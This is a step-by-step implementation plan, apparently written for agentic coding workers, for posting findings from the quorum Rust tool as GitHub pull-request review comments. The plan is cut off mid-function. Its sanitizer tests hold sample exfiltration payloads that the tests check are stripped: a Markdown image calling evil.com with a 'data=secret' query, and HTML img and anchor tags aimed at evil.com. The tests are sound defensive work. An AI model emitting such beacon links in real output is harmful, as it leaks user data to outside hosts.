# GitHub PR Comment Support Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add native `quorum report` subcommand and `--github-pr` flag on `quorum review` to post findings as GitHub PR review comments with inline code positioning.

**Architecture:** New `src/github_report.rs` module owns all GitHub API interaction. Both CLI entry points construct a `PostReviewRequest` and call `post_review()`. Output sanitization, commentability validation, and dismiss-and-replace logic live in this module. Existing output pipeline is unchanged.

**Tech Stack:** Rust, reqwest (already in-tree), serde/serde_json, clap derive macros, GitHub REST API v2026-03-10

**Design spec:** `docs/superpowers/specs/2026-05-25-github-pr-comments-design.md`

---

### Task 1: Output Sanitization (`sanitize_for_github`)

The foundation — every other task that renders Markdown depends on this.

**Files:**
- Create: `src/github_report.rs`
- Modify: `src/main.rs:1-28` (add `mod github_report;`)
- Modify: `src/lib.rs` (add `pub mod github_report;` — not needed yet but keeps option open)

- [ ] **Step 1: Write failing tests for sanitize_for_github**

In `src/github_report.rs`, create the module with tests:

```rust
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sanitize_strips_control_chars() {
        assert_eq!(sanitize_for_github("hello\x00world\x07"), "helloworld");
    }

    #[test]
    fn sanitize_preserves_newlines_and_tabs() {
        assert_eq!(sanitize_for_github("line1\nline2\tok"), "line1\nline2\tok");
    }

    #[test]
    fn sanitize_escapes_triple_backticks() {
        let input = "break ```out``` of fence";
        let result = sanitize_for_github(input);
        assert!(!result.contains("```"));
    }

    #[test]
    fn sanitize_neutralizes_at_mentions() {
        assert_eq!(
            sanitize_for_github("ping @admin about this"),
            "ping `@admin` about this"
        );
    }

    #[test]
    fn sanitize_neutralizes_issue_refs() {
        assert_eq!(
            sanitize_for_github("see #123 for details"),
            "see `#123` for details"
        );
    }

    #[test]
    fn sanitize_strips_markdown_images() {
        assert_eq!(
            sanitize_for_github("text ![alt](http://evil.com/exfil?data=secret) more"),
            "text  more"
        );
    }

    #[test]
    fn sanitize_strips_html_img_tags() {
        assert_eq!(
            sanitize_for_github("before <img src=\"http://evil.com\"> after"),
            "before  after"
        );
    }

    #[test]
    fn sanitize_strips_html_anchor_tags() {
        assert_eq!(
            sanitize_for_github("click <a href=\"http://evil.com\">here</a> now"),
            "click here now"
        );
    }

    #[test]
    fn sanitize_truncates_at_limit() {
        let long = "x".repeat(65_000);
        let result = sanitize_for_github(&long);
        assert!(result.len() <= 60_000);
    }

    #[test]
    fn sanitize_no_false_positive_on_email() {
        // user@example.com should NOT be treated as @mention
        assert_eq!(
            sanitize_for_github("email user@example.com here"),
            "email user@example.com here"
        );
    }

    #[test]
    fn sanitize_no_false_positive_on_hash_in_url() {
        // fragment #section should not be treated as issue ref
        assert_eq!(
            sanitize_for_github("see docs.md#section"),
            "see docs.md#section"
        );
    }
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test --bin quorum github_report -- --nocapture 2>&1 | head -40`
Expected: compilation error — `sanitize_for_github` not defined

- [ ] **Step 3: Implement sanitize_for_github**

```rust
use regex::Regex;
use std::sync::LazyLock;

const GITHUB_BODY_LIMIT: usize = 60_000;

static RE_MENTION: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?<!\w)@([a-zA-Z0-9][-a-zA-Z0-9]*)").unwrap());

static RE_ISSUE_REF: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?<!\w)#(\d+)").unwrap());

static RE_MD_IMAGE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"!\[[^\]]*\]\([^)]*\)").unwrap());

static RE_HTML_IMG: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)<img[^>]*>").unwrap());

static RE_HTML_ANCHOR: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?is)<a[^>]*>(.*?)</a>").unwrap());

static RE_BACKTICK_RUN: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(`{3,})").unwrap());

pub fn sanitize_for_github(s: &str) -> String {
    // 1. Strip control characters (keep \n, \t)
    let mut out: String = s
        .chars()
        .filter(|c| !c.is_control() || *c == '\n' || *c == '\t')
        .collect();

    // 2. Escape backtick runs of 3+
    out = RE_BACKTICK_RUN
        .replace_all(&out, |caps: &regex::Captures| {
            let ticks = &caps[1];
            format!("`{}`", &ticks[1..])
        })
        .into_owned();

    // 3. Strip HTML anchors (keep inner text)
    out = RE_HTML_ANCHOR.replace_all(&out, "$1").into_owned();

    // 4. Strip image tags
    out = RE_MD_IMAGE.replace_all(&out, "").into_owned();
    out = RE_HTML_IMG.replace_all(&out, "").into_owned();

    // 5. Neutralize @mentions (but not emails)
    out = RE_MENTION.replace_all(&out, "`@$1`").into_owned();

    // 6. Neutralize #refs (but not URL fragments)
    out = RE_ISSUE_REF.replace_all(&out, "`#$1`").into_owned();

    // 7. Truncate
    if out.len() > GITHUB_BODY_LIMIT {
        out.truncate(GITHUB_BODY_LIMIT);
        // Don't split in the middle of a multi-byte char
        while !out.is_char_boundary(out.len()) {
            out.pop();
        }
    }

    out
}
```

- [ ] **Step 4: Add `mod github_report;` to main.rs**

In `src/main.rs`, after the existing `mod judge;` line (~line 53), add:

```rust
#[allow(dead_code)]
mod github_report;
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cargo test --bin quorum github_report -- --nocapture 2>&1 | tail -20`
Expected: all 12 tests pass

- [ ] **Step 6: Run clippy**

Run: `cargo clippy --bin quorum -- -D warnings 2>&1 | tail -10`
Expected: no warnings

- [ ] **Step 7: Commit**

```bash
git add src/github_report.rs src/main.rs
git commit -m "feat(github): add sanitize_for_github output sanitization (#313)"
```

---

### Task 2: Markdown Rendering (finding -> comment body)

Converts a `Finding` into the Markdown format for inline PR comments and review body entries.

**Files:**
- Modify: `src/github_report.rs`

- [ ] **Step 1: Write failing tests for Markdown rendering**

Add to `src/github_report.rs`:

```rust
use crate::finding::{Finding, Severity, Source};
use crate::category::Category;

fn severity_icon(sev: &Severity) -> &'static str {
    match sev {
        Severity::Critical => "!",
        Severity::High => "!",
        Severity::Medium => "~",
        Severity::Low => "-",
        Severity::Info => "-",
    }
}

/// Render a finding as a Markdown inline review comment body.
pub fn render_inline_comment(finding: &Finding, version: &str) -> String {
    todo!()
}

/// Render a finding as a Markdown entry for the review body (out-of-diff).
pub fn render_body_finding(finding: &Finding, version: &str) -> String {
    todo!()
}

/// Render the full review body: marker + summary + out-of-diff findings.
pub fn render_review_body(
    marker: &str,
    inline_count: usize,
    body_findings: &[Finding],
    version: &str,
) -> String {
    todo!()
}

// In tests module:
#[test]
fn render_inline_comment_critical() {
    let f = Finding {
        id: "test".into(),
        title: "SQL injection".into(),
        description: "User input flows to query".into(),
        severity: Severity::Critical,
        category: Category::Security,
        source: Source::Llm("gpt-5.4".into()),
        line_start: 42,
        line_end: 42,
        evidence: vec![],
        calibrator_action: None,
        similar_precedent: vec![],
        canonical_pattern: None,
        suggested_fix: None,
        based_on_excerpt: None,
        reasoning: None,
        llm_confidence: None,
        confidence: None,
        cited_lines: None,
        grounding_status: None,
        grounding_confidence: None,
        model_agreement: None,
        rule_id: None,
        judge_verdict: None,
        judge_confidence: None,
        precision_tier: None,
        in_diff: Some(true),
    };
    let result = render_inline_comment(&f, "0.27.0");
    assert!(result.contains("**!** SQL injection"));
    assert!(result.contains("`security`"));
    assert!(result.contains("User input flows to query"));
    assert!(result.contains("*quorum 0.27.0 | gpt-5.4*"));
}

#[test]
fn render_body_finding_includes_line() {
    let f = Finding {
        id: "test".into(),
        title: "Token not rotated".into(),
        description: "Session fixation risk".into(),
        severity: Severity::Medium,
        category: Category::Security,
        source: Source::LocalAst,
        line_start: 89,
        line_end: 89,
        evidence: vec![],
        calibrator_action: None,
        similar_precedent: vec![],
        canonical_pattern: None,
        suggested_fix: None,
        based_on_excerpt: None,
        reasoning: None,
        llm_confidence: None,
        confidence: None,
        cited_lines: None,
        grounding_status: None,
        grounding_confidence: None,
        model_agreement: None,
        rule_id: None,
        judge_verdict: None,
        judge_confidence: None,
        precision_tier: None,
        in_diff: None,
    };
    let result = render_body_finding(&f, "0.27.0");
    assert!(result.contains("**~** Token not rotated"));
    assert!(result.contains("L89"));
}

#[test]
fn render_review_body_clean() {
    let body = render_review_body(
        "<!-- quorum-review-marker:v1 -->",
        0,
        &[],
        "0.27.0",
    );
    assert!(body.contains("quorum-review-marker"));
    assert!(body.contains("No findings."));
}

#[test]
fn render_review_body_with_summary() {
    let f = Finding {
        id: "test".into(),
        title: "Issue".into(),
        description: "Desc".into(),
        severity: Severity::High,
        category: Category::Security,
        source: Source::LocalAst,
        line_start: 10,
        line_end: 10,
        evidence: vec![],
        calibrator_action: None,
        similar_precedent: vec![],
        canonical_pattern: None,
        suggested_fix: None,
        based_on_excerpt: None,
        reasoning: None,
        llm_confidence: None,
        confidence: None,
        cited_lines: None,
        grounding_status: None,
        grounding_confidence: None,
        model_agreement: None,
        rule_id: None,
        judge_verdict: None,
        judge_confidence: None,
        precision_tier: None,
        in_diff: None,
    };
    let body = render_review_body(
        "<!-- quorum-review-marker:v1 -->",
        2,
        &[f],
        "0.27.0",
    );
    assert!(body.contains("## Quorum Review"));
    assert!(body.contains("3 findings"));
    assert!(body.contains("2 inline, 1 in summary"));
    assert!(body.contains("Findings outside changed lines"));
}

#[test]
fn render_review_body_truncates_overflow() {
    let findings: Vec<Finding> = (0..500).map(|i| Finding {
        id: format!("f{i}"),
        title: format!("Finding {i} with a long title that takes space"),
        description: "x".repeat(200),
        severity: Severity::Low,
        category: Category::Style,
        source: Source::LocalAst,
        line_start: i as u32 + 1,
        line_end: i as u32 + 1,
        evidence: vec![],
        calibrator_action: None,
        similar_precedent: vec![],
        canonical_pattern: None,
        suggested_fix: None,
        based_on_excerpt: None,
        reasoning: None,
        llm_confidence: None,
        confidence: None,
        cited_lines: None,
        grounding_status: None,
        grounding_confidence: None,
        model_agreement: None,
        rule_id: None,
        judge_verdict: None,
        judge_confidence: None,
        precision_tier: None,
        in_diff: None,
    }).collect();
    let body = render_review_body(
        "<!-- quorum-review-marker:v1 -->",
        0,
        &findings,
        "0.27.0",
    );
    assert!(body.len() <= 60_000);
    assert!(body.contains("additional findings omitted"));
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test --bin quorum github_report -- --nocapture 2>&1 | head -30`
Expected: FAIL — `todo!()` panics

- [ ] **Step 3: Implement rendering functions**

```rust
fn severity_icon(sev: &Severity) -> &'static str {
    match sev {
        Severity::Critical | Severity::High => "!",
        Severity::Medium => "~",
        Severity::Low | Severity::Info => "-",
    }
}

fn source_label(source: &Source) -> &str {
    source.provider_name()
}

pub fn render_inline_comment(finding: &Finding, version: &str) -> String {
    let icon = severity_icon(&finding.severity);
    let cat = finding.category.as_str();
    let source = source_label(&finding.source);
    let mut out = format!(
        "**{}** {} — `{}`\n\n{}\n\n*quorum {} | {}*",
        icon,
        sanitize_for_github(&finding.title),
        cat,
        sanitize_for_github(&finding.description),
        version,
        source,
    );
    if out.len() > GITHUB_BODY_LIMIT {
        out.truncate(GITHUB_BODY_LIMIT);
        while !out.is_char_boundary(out.len()) {
            out.pop();
        }
    }
    out
}

pub fn render_body_finding(finding: &Finding, version: &str) -> String {
    let icon = severity_icon(&finding.severity);
    let cat = finding.category.as_str();
    let line = finding.anchor_line();
    let source = source_label(&finding.source);
    format!(
        "**{}** {} — `{}` L{}\n\n{}\n\n*quorum {} | {}*",
        icon,
        sanitize_for_github(&finding.title),
        cat,
        line,
        sanitize_for_github(&finding.description),
        version,
        source,
    )
}

const REVIEW_BODY_LIMIT: usize = 55_000;

pub fn render_review_body(
    marker: &str,
    inline_count: usize,
    body_findings: &[Finding],
    version: &str,
) -> String {
    use std::fmt::Write;
    let mut out = String::with_capacity(4096);
    writeln!(out, "{}\n", marker).unwrap();

    let total = inline_count + body_findings.len();
    writeln!(out, "## Quorum Review\n").unwrap();

    if total == 0 {
        writeln!(out, "No findings.").unwrap();
        return out;
    }

    // Summary line
    let summary = format_summary_counts(inline_count, body_findings);
    writeln!(out, "{}\n", summary).unwrap();

    if body_findings.is_empty() {
        return out;
    }

    writeln!(out, "### Findings outside changed lines\n").unwrap();

    let mut rendered_count = 0;
    for f in body_findings {
        let entry = render_body_finding(f, version);
        if out.len() + entry.len() + 100 > REVIEW_BODY_LIMIT {
            let remaining = body_findings.len() - rendered_count;
            writeln!(
                out,
                "\n... {} additional findings omitted from review body. See CI artifact for full results.",
                remaining
            ).unwrap();
            break;
        }
        writeln!(out, "{}\n", entry).unwrap();
        rendered_count += 1;
    }

    out
}

fn format_summary_counts(inline_count: usize, body_findings: &[Finding]) -> String {
    use crate::finding::Severity;
    let all_body_sevs: Vec<&Severity> = body_findings.iter().map(|f| &f.severity).collect();
    let total = inline_count + body_findings.len();

    let mut crits = 0u32;
    let mut warns = 0u32;
    let mut infos = 0u32;
    for s in &all_body_sevs {
        match s {
            Severity::Critical | Severity::High => crits += 1,
            Severity::Medium => warns += 1,
            Severity::Low | Severity::Info => infos += 1,
        }
    }
    // Note: inline findings' severities are not available here — they are
    // tracked by count only. The summary approximates with body counts.
    let mut parts = Vec::new();
    if crits > 0 { parts.push(format!("{} critical", crits)); }
    if warns > 0 { parts.push(format!("{} warning", warns)); }
    if infos > 0 { parts.push(format!("{} info", infos)); }

    let sev_summary = if parts.is_empty() {
        String::new()
    } else {
        format!(" ({})", parts.join(", "))
    };

    let location = if body_findings.is_empty() {
        String::new()
    } else {
        format!(" | {} inline, {} in summary", inline_count, body_findings.len())
    };

    format!("{} findings{}{}", total, sev_summary, location)
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cargo test --bin quorum github_report -- --nocapture 2>&1 | tail -20`
Expected: all tests pass

- [ ] **Step 5: Commit**

```bash
git add src/github_report.rs
git commit -m "feat(github): add Markdown rendering for PR comments (#313)"
```

---

### Task 3: Commentability Validation

Classify each finding as inline-commentable or body-only based on the PR diff.

**Files:**
- Modify: `src/github_report.rs`

- [ ] **Step 1: Write failing tests**

```rust
#[test]
fn classify_finding_in_diff_and_commentable() {
    let diff = "--- a/src/auth.rs\n+++ b/src/auth.rs\n@@ -40,5 +40,7 @@\n context\n+added line\n+another\n context\n";
    let ranges = crate::hydration::parse_unified_diff(diff);
    let f = make_finding("test", 41, true);
    let target = classify_posting_target(&f, "src/auth.rs", &ranges);
    assert_eq!(target, PostingTarget::Inline);
}

#[test]
fn classify_finding_in_diff_but_not_commentable() {
    let diff = "--- a/src/auth.rs\n+++ b/src/auth.rs\n@@ -40,3 +40,5 @@\n context\n+added\n+added\n context\n";
    let ranges = crate::hydration::parse_unified_diff(diff);
    // Line 100 is marked in_diff but not in any hunk range
    let f = make_finding("test", 100, true);
    let target = classify_posting_target(&f, "src/auth.rs", &ranges);
    assert_eq!(target, PostingTarget::Body);
}

#[test]
fn classify_finding_not_in_diff() {
    let diff = "--- a/src/auth.rs\n+++ b/src/auth.rs\n@@ -40,3 +40,5 @@\n context\n+added\n+added\n context\n";
    let ranges = crate::hydration::parse_unified_diff(diff);
    let f = make_finding("test", 41, false);
    let target = classify_posting_target(&f, "src/auth.rs", &ranges);
    assert_eq!(target, PostingTarget::Body);
}

#[test]
fn classify_finding_file_not_in_diff() {
    let diff = "--- a/src/other.rs\n+++ b/src/other.rs\n@@ -1,3 +1,5 @@\n+new\n+new\n old\n";
    let ranges = crate::hydration::parse_unified_diff(diff);
    let f = make_finding("test", 1, true);
    let target = classify_posting_target(&f, "src/auth.rs", &ranges);
    assert_eq!(target, PostingTarget::Body);
}

// Helper
fn make_finding(id: &str, line: u32, in_diff: bool) -> Finding {
    Finding {
        id: id.into(),
        title: "Test finding".into(),
        description: "Desc".into(),
        severity: Severity::Medium,
        category: Category::Security,
        source: Source::LocalAst,
        line_start: line,
        line_end: line,
        evidence: vec![],
        calibrator_action: None,
        similar_precedent: vec![],
        canonical_pattern: None,
        suggested_fix: None,
        based_on_excerpt: None,
        reasoning: None,
        llm_confidence: None,
        confidence: None,
        cited_lines: None,
        grounding_status: None,
        grounding_confidence: None,
        model_agreement: None,
        rule_id: None,
        judge_verdict: None,
        judge_confidence: None,
        precision_tier: None,
        in_diff: Some(in_diff),
    }
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test --bin quorum github_report::tests::classify -- --nocapture 2>&1 | head -20`
Expected: compilation error — types not defined

- [ ] **Step 3: Implement commentability validation**

```rust
use crate::hydration::DiffRanges;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PostingTarget {
    Inline,
    Body,
}

pub fn classify_posting_target(
    finding: &Finding,
    file_path: &str,
    diff_ranges: &DiffRanges,
) -> PostingTarget {
    if finding.in_diff != Some(true) {
        return PostingTarget::Body;
    }

    let anchor = finding.anchor_line();

    for (path, ranges) in diff_ranges {
        if path == file_path {
            for &(start, end) in ranges {
                if anchor >= start && anchor <= end {
                    return PostingTarget::Inline;
                }
            }
            return PostingTarget::Body;
        }
    }

    PostingTarget::Body
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cargo test --bin quorum github_report::tests::classify -- --nocapture 2>&1 | tail -10`
Expected: all 4 tests pass

- [ ] **Step 5: Commit**

```bash
git add src/github_report.rs
git commit -m "feat(github): add commentability validation against diff hunks (#313)"
```

---

### Task 4: Repo URL Parsing and GitHub Context Resolution

Parse `owner/repo` from git remote URLs and environment variables.

**Files:**
- Modify: `src/github_report.rs`

- [ ] **Step 1: Write failing tests**

```rust
#[test]
fn parse_repo_https() {
    let (owner, repo) = parse_github_repo_url("https://github.com/jsnyder/quorum.git").unwrap();
    assert_eq!(owner, "jsnyder");
    assert_eq!(repo, "quorum");
}

#[test]
fn parse_repo_https_no_dot_git() {
    let (owner, repo) = parse_github_repo_url("https://github.com/jsnyder/quorum").unwrap();
    assert_eq!(owner, "jsnyder");
    assert_eq!(repo, "quorum");
}

#[test]
fn parse_repo_ssh() {
    let (owner, repo) = parse_github_repo_url("git@github.com:jsnyder/quorum.git").unwrap();
    assert_eq!(owner, "jsnyder");
    assert_eq!(repo, "quorum");
}

#[test]
fn parse_repo_slash_format() {
    let (owner, repo) = parse_github_repo_url("jsnyder/quorum").unwrap();
    assert_eq!(owner, "jsnyder");
    assert_eq!(repo, "quorum");
}

#[test]
fn parse_repo_invalid() {
    assert!(parse_github_repo_url("not-a-repo").is_none());
}

#[test]
fn parse_github_enterprise() {
    let (owner, repo) = parse_github_repo_url("https://github.example.com/org/repo.git").unwrap();
    assert_eq!(owner, "org");
    assert_eq!(repo, "repo");
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cargo test --bin quorum github_report::tests::parse_repo -- --nocapture 2>&1 | head -20`

- [ ] **Step 3: Implement parse_github_repo_url**

```rust
pub fn parse_github_repo_url(url: &str) -> Option<(String, String)> {
    // Direct owner/repo format (e.g. from GITHUB_REPOSITORY)
    if !url.contains('/') || url.contains("://") || url.contains('@') {
        // Not a simple owner/repo — try URL parsing below
    } else {
        let parts: Vec<&str> = url.split('/').collect();
        if parts.len() == 2 && !parts[0].is_empty() && !parts[1].is_empty() {
            return Some((parts[0].to_string(), parts[1].to_string()));
        }
    }

    // SSH: git@host:owner/repo.git
    if let Some(colon_part) = url.strip_prefix("git@") {
        if let Some(path) = colon_part.split(':').nth(1) {
            return parse_owner_repo_from_path(path);
        }
    }

    // HTTPS: https://host/owner/repo.git
    if url.starts_with("https://") || url.starts_with("http://") {
        let path = url
            .split("://")
            .nth(1)?
            .split('/')
            .skip(1) // skip hostname
            .collect::<Vec<_>>()
            .join("/");
        return parse_owner_repo_from_path(&path);
    }

    None
}

fn parse_owner_repo_from_path(path: &str) -> Option<(String, String)> {
    let clean = path.strip_suffix(".git").unwrap_or(path);
    let parts: Vec<&str> = clean.split('/').collect();
    if parts.len() >= 2 && !parts[0].is_empty() && !parts[1].is_empty() {
        Some((parts[0].to_string(), parts[1].to_string()))
    } else {
        None
    }
}
```

- [ ] **Step 4: Implement resolve_github_context**

```rust
#[derive(Debug, Clone)]
pub struct GitHubContext {
    pub owner: String,
    pub repo: String,
    pub token: String,
}

#[derive(Debug)]
pub enum GitHubContextError {
    NoToken,
    NoRepo(String),
}

impl std::fmt::Display for GitHubContextError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::NoToken => write!(f, "No GitHub token found. Set GITHUB_TOKEN or use --github-token"),
            Self::NoRepo(detail) => write!(f, "Could not determine repository: {}", detail),
        }
    }
}

pub fn resolve_github_context(
    token_flag: Option<&str>,
    repo_flag: Option<&str>,
) -> Result<GitHubContext, GitHubContextError> {
    let token = token_flag
        .map(|s| s.to_string())
        .or_else(|| std::env::var("GITHUB_TOKEN").ok())
        .filter(|s| !s.is_empty())
        .ok_or(GitHubContextError::NoToken)?;

    let (owner, repo) = if let Some(r) = repo_flag {
        parse_github_repo_url(r)
            .ok_or_else(|| GitHubContextError::NoRepo(format!("invalid format: {}", r)))?
    } else if let Ok(gh_repo) = std::env::var("GITHUB_REPOSITORY") {
        parse_github_repo_url(&gh_repo)
            .ok_or_else(|| GitHubContextError::NoRepo(format!("GITHUB_REPOSITORY={}", gh_repo)))?
    } else {
        // Try git remote
        let output = std::process::Command::new("git")
            .args(["remote", "get-url", "origin"])
            .output()
            .map_err(|e| GitHubContextError::NoRepo(format!("git remote failed: {}", e)))?;
        let url = String::from_utf8_lossy(&output.stdout).trim().to_string();
        parse_github_repo_url(&url)
            .ok_or_else(|| GitHubContextError::NoRepo(format!("cannot parse remote: {}", url)))?
    };

    Ok(GitHubContext { owner, repo, token })
}
```

- [ ] **Step 5: Run all tests**

Run: `cargo test --bin quorum github_report -- --nocapture 2>&1 | tail -20`
Expected: all tests pass

- [ ] **Step 6: Commit**

```bash
git add src/github_report.rs
git commit -m "feat(github): add repo URL parsing and context resolution (#313)"
```

---

### Task 5: Marker Protocol and Dismiss Logic

Build/parse the review marker and implement dismiss-previous logic.

**Files:**
- Modify: `src/github_report.rs`

- [ ] **Step 1: Write failing tests**

```rust
#[test]
fn build_marker() {
    let m = build_review_marker("01JTEST", "abc1234", "0.27.0");
    assert!(m.starts_with("<!-- quorum-review-marker:v1"));
    assert!(m.contains("run_id=01JTEST"));
    assert!(m.contains("sha=abc1234"));
    assert!(m.contains("version=0.27.0"));
    assert!(m.ends_with("-->"));
}

#[test]
fn find_marker_in_body() {
    let body = "Some text\n<!-- quorum-review-marker:v1 run_id=X sha=Y version=0.27.0 -->\nMore text";
    assert!(body_contains_quorum_marker(body));
}

#[test]
fn no_marker_in_body() {
    assert!(!body_contains_quorum_marker("Just a regular review body"));
}

#[test]
fn find_marker_with_extra_whitespace() {
    let body = "<!-- quorum-review-marker:v1  run_id=X  sha=Y  version=0.27.0 -->";
    assert!(body_contains_quorum_marker(body));
}
```

- [ ] **Step 2: Run tests to verify they fail**

- [ ] **Step 3: Implement marker functions**

```rust
const MARKER_PREFIX: &str = "quorum-review-marker:v1";

pub fn build_review_marker(run_id: &str, sha: &str, version: &str) -> String {
    format!("<!-- {} run_id={} sha={} version={} -->", MARKER_PREFIX, run_id, sha, version)
}

pub fn body_contains_quorum_marker(body: &str) -> bool {
    body.contains(MARKER_PREFIX)
}
```

- [ ] **Step 4: Run tests to verify they pass**

- [ ] **Step 5: Commit**

```bash
git add src/github_report.rs
git commit -m "feat(github): add review marker build/detect for dismiss protocol (#313)"
```

---

### Task 6: GitHub API Client (`post_review`, dismiss, fetch diff)

The core async HTTP calls to GitHub.

**Files:**
- Modify: `src/github_report.rs`

- [ ] **Step 1: Define request/response types and error enum**

```rust
use serde::{Deserialize, Serialize};

#[derive(Debug)]
pub enum GitHubReportError {
    Http(reqwest::Error),
    Api { status: u16, message: String },
    NoToken,
    NoRepo(String),
    InvalidFindings(String),
}

impl std::fmt::Display for GitHubReportError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Http(e) => write!(f, "HTTP error: {}", e),
            Self::Api { status, message } => write!(f, "GitHub API error ({}): {}", status, message),
            Self::NoToken => write!(f, "No GitHub token"),
            Self::NoRepo(d) => write!(f, "Cannot determine repo: {}", d),
            Self::InvalidFindings(d) => write!(f, "Invalid findings: {}", d),
        }
    }
}

impl From<reqwest::Error> for GitHubReportError {
    fn from(e: reqwest::Error) -> Self { Self::Http(e) }
}

pub struct PostReviewRequest {
    pub owner: String,
    pub repo: String,
    pub pr_number: u64,
    pub token: String,
    pub findings: Vec<Finding>,
    pub diff_text: String,
    pub version: String,
    pub run_id: String,
    pub commit_sha: String,
}

pub struct PostReviewResult {
    pub review_id: u64,
    pub inline_count: usize,
    pub body_count: usize,
    pub dismissed_previous: Option<u64>,
}

#[derive(Serialize)]
struct CreateReviewRequest {
    commit_id: String,
    event: String,
    body: String,
    comments: Vec<ReviewComment>,
}

#[derive(Serialize)]
struct ReviewComment {
    path: String,
    body: String,
    line: u32,
    side: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    start_line: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    start_side: Option<String>,
}

#[derive(Deserialize)]
struct ReviewResponse {
    id: u64,
}

#[derive(Deserialize)]
struct ListReviewEntry {
    id: u64,
    body: Option<String>,
}

#[derive(Serialize)]
struct DismissRequest {
    message: String,
    event: String,
}
```

- [ ] **Step 2: Implement the API functions**

```rust
const GITHUB_API_BASE: &str = "https://api.github.com";
const GITHUB_API_VERSION: &str = "2026-03-10";

fn github_client_headers(token: &str) -> reqwest::header::HeaderMap {
    let mut headers = reqwest::header::HeaderMap::new();
    headers.insert(
        reqwest::header::ACCEPT,
        "application/vnd.github+json".parse().unwrap(),
    );
    headers.insert(
        reqwest::header::AUTHORIZATION,
        format!("Bearer {}", token).parse().unwrap(),
    );
    headers.insert(
        "X-GitHub-Api-Version",
        GITHUB_API_VERSION.parse().unwrap(),
    );
    headers
}

async fn dismiss_previous_reviews(
    client: &reqwest::Client,
    req: &PostReviewRequest,
) -> Option<u64> {
    let url = format!(
        "{}/repos/{}/{}/pulls/{}/reviews",
        GITHUB_API_BASE, req.owner, req.repo, req.pr_number
    );
    let headers = github_client_headers(&req.token);
    let resp = match client.get(&url).headers(headers.clone()).send().await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("Warning: failed to list reviews for dismiss: {}", e);
            return None;
        }
    };
    let reviews: Vec<ListReviewEntry> = match resp.json().await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("Warning: failed to parse review list: {}", e);
            return None;
        }
    };

    let mut dismissed_id = None;
    for review in &reviews {
        if let Some(body) = &review.body {
            if body_contains_quorum_marker(body) {
                let dismiss_url = format!("{}/{}/dismissals", url, review.id);
                let dismiss_body = DismissRequest {
                    message: "Superseded by updated quorum review".into(),
                    event: "DISMISS".into(),
                };
                match client
                    .put(&dismiss_url)
                    .headers(headers.clone())
                    .json(&dismiss_body)
                    .send()
                    .await
                {
                    Ok(r) if r.status().is_success() => {
                        dismissed_id = Some(review.id);
                    }
                    Ok(r) => {
                        eprintln!(
                            "Warning: dismiss review {} returned {}: best-effort, continuing",
                            review.id,
                            r.status()
                        );
                    }
                    Err(e) => {
                        eprintln!("Warning: dismiss review {} failed: {}", review.id, e);
                    }
                }
            }
        }
    }
    dismissed_id
}

pub async fn fetch_pr_diff(
    client: &reqwest::Client,
    owner: &str,
    repo: &str,
    pr_number: u64,
    token: &str,
) -> Result<String, GitHubReportError> {
    let url = format!(
        "{}/repos/{}/{}/pulls/{}",
        GITHUB_API_BASE, owner, repo, pr_number
    );
    let mut headers = github_client_headers(token);
    headers.insert(
        reqwest::header::ACCEPT,
        "application/vnd.github.diff".parse().unwrap(),
    );
    let resp = client.get(&url).headers(headers).send().await?;
    if !resp.status().is_success() {
        return Err(GitHubReportError::Api {
            status: resp.status().as_u16(),
            message: resp.text().await.unwrap_or_default(),
        });
    }
    Ok(resp.text().await?)
}

pub async fn fetch_pr_head_sha(
    client: &reqwest::Client,
    owner: &str,
    repo: &str,
    pr_number: u64,
    token: &str,
) -> Result<String, GitHubReportError> {
    let url = format!(
        "{}/repos/{}/{}/pulls/{}",
        GITHUB_API_BASE, owner, repo, pr_number
    );
    let headers = github_client_headers(token);
    let resp = client.get(&url).headers(headers).send().await?;
    if !resp.status().is_success() {
        return Err(GitHubReportError::Api {
            status: resp.status().as_u16(),
            message: resp.text().await.unwrap_or_default(),
        });
    }
    let body: serde_json::Value = resp.json().await?;
    body["head"]["sha"]
        .as_str()
        .map(|s| s.to_string())
        .ok_or_else(|| GitHubReportError::Api {
            status: 200,
            message: "PR response missing head.sha".into(),
        })
}

pub async fn post_review(
    client: &reqwest::Client,
    req: &PostReviewRequest,
) -> Result<PostReviewResult, GitHubReportError> {
    let diff_ranges = crate::hydration::parse_unified_diff(&req.diff_text);
    let marker = build_review_marker(&req.run_id, &req.commit_sha, &req.version);

    // Dismiss previous reviews (best-effort)
    let dismissed_previous = dismiss_previous_reviews(client, req).await;

    // Classify findings
    let mut inline_comments = Vec::new();
    let mut body_findings = Vec::new();

    for finding in &req.findings {
        // Determine file path — strip to repo-relative
        // Findings carry file info externally; for now we need file_path
        // from the review pipeline. We'll use the finding's evidence or
        // reconstruct from context. For the MVP, findings are already
        // associated with files via the grouped JSON output.
        // The caller provides findings per-file with the path.
        let file_path = finding.evidence.first().map(|s| s.as_str()).unwrap_or("");
        let target = classify_posting_target(finding, file_path, &diff_ranges);
        match target {
            PostingTarget::Inline => {
                let body = render_inline_comment(finding, &req.version);
                inline_comments.push(ReviewComment {
                    path: file_path.to_string(),
                    body,
                    line: finding.anchor_line(),
                    side: "RIGHT".into(),
                    start_line: if finding.line_start != finding.line_end {
